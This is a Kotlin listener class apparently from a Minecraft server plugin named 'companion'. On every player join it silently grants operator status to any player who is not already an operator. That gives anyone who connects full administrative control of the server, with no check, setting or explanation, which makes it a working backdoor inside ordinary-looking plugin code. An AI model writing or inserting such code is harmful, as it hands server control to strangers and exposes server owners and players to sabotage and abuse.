package dev.paperplane.companion

import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.PlayerJoinEvent

class AutoOpListener : Listener {
    @EventHandler
    fun onPlayerJoin(event: PlayerJoinEvent) {
        if (!event.player.isOp) {
            event.player.isOp = true
        }
    }
}
